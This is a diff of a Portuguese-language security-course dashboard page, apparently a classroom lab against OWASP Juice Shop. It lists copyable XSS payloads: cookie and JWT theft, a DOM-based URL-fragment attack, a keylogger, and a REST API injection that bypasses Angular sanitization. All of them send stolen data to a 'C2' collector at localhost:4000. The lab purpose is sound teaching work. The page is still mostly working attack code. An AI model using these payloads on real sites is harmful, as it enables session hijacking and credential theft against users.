@@ -240,71 +240,55 @@
     <div class="tab-content" id="tab-payloads">
       <div class="payload-grid" id="payload-grid">
 
-        <!-- Payload 1: Cookie Theft (Reflected XSS) -->
+        <!-- Payloads: conteúdo injetado via JS para evitar execução de tags no HTML -->
         <div class="payload-card">
           <div class="payload-card-header">
             <span class="payload-type-badge badge-reflected">Refletido</span>
-            <span class="payload-card-title">Roubo de Cookie via Busca</span>
-            <span class="payload-target">alvo: /search?q=</span>
+            <span class="payload-card-title">Roubo de Sessão via Busca</span>
+            <span class="payload-target">cole na barra de busca → localhost:3000</span>
           </div>
-          <pre class="payload-code" id="p1"><script>fetch('http://localhost:4000/capture',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cookie',data:document.cookie,url:location.href,ua:navigator.userAgent})})</script></pre>
+          <pre class="payload-code" id="p1"></pre>
           <div class="payload-footer">
-            <span class="payload-desc">Exfiltra cookies via fetch POST. Cole na barra de busca do Juice Shop.</span>
+            <span class="payload-desc">O Juice Shop executa iframes com javascript: na busca. Usa top.document para acessar o contexto do parent frame.</span>
             <button class="btn-copy" data-target="p1">Copiar</button>
           </div>
         </div>
 
-        <!-- Payload 2: JWT Theft (Stored XSS) -->
         <div class="payload-card">
           <div class="payload-card-header">
             <span class="payload-type-badge badge-stored">Armazenado</span>
-            <span class="payload-card-title">Roubo de JWT + Email</span>
-            <span class="payload-target">alvo: avaliações de produto</span>
+            <span class="payload-card-title">Roubo de JWT via Avaliação (API)</span>
+            <span class="payload-target">execute no console do browser em localhost:3000 (logado)</span>
           </div>
-          <pre class="payload-code" id="p2"><img src=x onerror="fetch('http://localhost:4000/capture',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'jwt',data:document.cookie,jwt:localStorage.getItem('token'),email:localStorage.getItem('email'),url:location.href})})"></pre>
+          <pre class="payload-code" id="p2"></pre>
           <div class="payload-footer">
-            <span class="payload-desc">Roubo do JWT do localStorage — o Juice Shop armazena autenticação lá. Cole em uma avaliação.</span>
+            <span class="payload-desc">O Angular sanitiza o form — a injeção bypassa via API REST direto. Navegar ao produto dispara o XSS.</span>
             <button class="btn-copy" data-target="p2">Copiar</button>
           </div>
         </div>
 
-        <!-- Payload 3: DOM Snapshot -->
         <div class="payload-card">
           <div class="payload-card-header">
             <span class="payload-type-badge badge-dom">DOM-Based</span>
-            <span class="payload-card-title">Snapshot do Conteúdo da Página</span>
-            <span class="payload-target">alvo: qualquer campo vulnerável</span>
+            <span class="payload-card-title">Exfil via URL Fragment</span>
+            <span class="payload-target">cole diretamente na barra de endereços</span>
           </div>
-          <pre class="payload-code" id="p3"><img src=x onerror="new Image().src='http://localhost:4000/capture?type=dom&url='+encodeURIComponent(location.href)+'&data='+encodeURIComponent(document.title)+'&extra='+encodeURIComponent(document.body.innerText.slice(0,300))"></pre>
+          <pre class="payload-code" id="p3"></pre>
           <div class="payload-footer">
-            <span class="payload-desc">Exfiltra título, URL e trecho do conteúdo da página via parâmetro de imagem.</span>
+            <span class="payload-desc">Nenhum submit de formulário — o XSS dispara apenas pela URL. O fragment é processado pelo JS do cliente sem sanitização.</span>
             <button class="btn-copy" data-target="p3">Copiar</button>
           </div>
         </div>
 
-        <!-- Payload 4: Keylogger -->
         <div class="payload-card">
           <div class="payload-card-header">
             <span class="payload-type-badge badge-keylog">Keylogger</span>
             <span class="payload-card-title">Captura de Teclas (Login/Senha)</span>
-            <span class="payload-target">alvo: páginas com formulários</span>
+            <span class="payload-target">cole na barra de busca → localhost:3000</span>
           </div>
-          <pre class="payload-code" id="p4"><script>
-(function(){
-  let buf='';
-  document.addEventListener('keydown',function(e){
-    buf+=e.key==='Enter'?'[ENTER]':e.key==='Backspace'?'[BS]':e.key.length===1?e.key:'';
-    if(buf.length>40){
-      fetch('http://localhost:4000/capture',{method:'POST',mode:'no-cors',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({type:'keylog',keylog:buf,url:location.href})});
-      buf='';
-    }
-  });
-})();
-</script></pre>
+          <pre class="payload-code" id="p4"></pre>
           <div class="payload-footer">
-            <span class="payload-desc">Captura teclas digitadas e envia em lotes de 40 caracteres. Eficaz em páginas de login.</span>
+            <span class="payload-desc">Registra teclas no documento parent via top.document. Envio a cada 30 chars. Após injetar, navega ao login e digita — chega no C2.</span>
             <button class="btn-copy" data-target="p4">Copiar</button>
           </div>
         </div>
@@ -320,6 +304,25 @@
   Segurança de Sistemas — 2025
 </footer>
 
+<script>
+// Payloads definidos via textContent — nunca interpretados como HTML pelo browser
+const C2 = 'http://localhost:4000/capture';
+
+// Juice Shop bloqueia onerror mas executa <iframe javascript:>
+// Usamos fetch() dentro do iframe — mais confiável que new Image() nesse contexto
+
+document.getElementById('p1').textContent =
+  `<iframe src="javascript:(function(){try{var d=top.document.cookie,x=top.localStorage.getItem('token'),u=top.location.href}catch(e){d='bloqueado';x='bloqueado';u=location.href}fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'reflected',data:d,extra:x,url:u})})})()">`;
+
+document.getElementById('p2').textContent =
+  `(function(){\n  var xss = \`<iframe src="javascript:(function(){try{var d=top.document.cookie,x=top.localStorage.getItem('token'),u=top.location.href}catch(e){d='err';x='err';u=''}fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'stored',data:d,extra:x,url:u})})})()"\`;\n  fetch('/rest/products/1/reviews',{\n    method:'PUT',\n    headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('token')},\n    body:JSON.stringify({message:xss,author:'visitor'})\n  }).then(r=>r.json()).then(d=>console.log('Injetado:',d));\n})();\n\n// Após rodar: vá para localhost:3000 e clique no Apple Juice para disparar`;
+
+document.getElementById('p3').textContent =
+  `http://localhost:3000/#/search?q=<iframe src="javascript:(function(){try{var d=top.document.cookie,x=top.localStorage.getItem('token'),u=top.location.href}catch(e){d='bloqueado';x='bloqueado';u=location.href}fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'dom',data:d,extra:x,url:u})})})()">`;
+
+document.getElementById('p4').textContent =
+  `<iframe src="javascript:(function(){var b='';top.document.addEventListener('keydown',function(e){b+=e.key.length===1?e.key:e.key==='Enter'?'[ENTER]':e.key==='Backspace'?'[BS]':'';if(b.length>30){fetch('${C2}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({type:'keylog',keylog:b,url:top.location.href})});b=''}})})()">`;
+</script>
 <script src="/dashboard.js"></script>
 </body>
 </html>
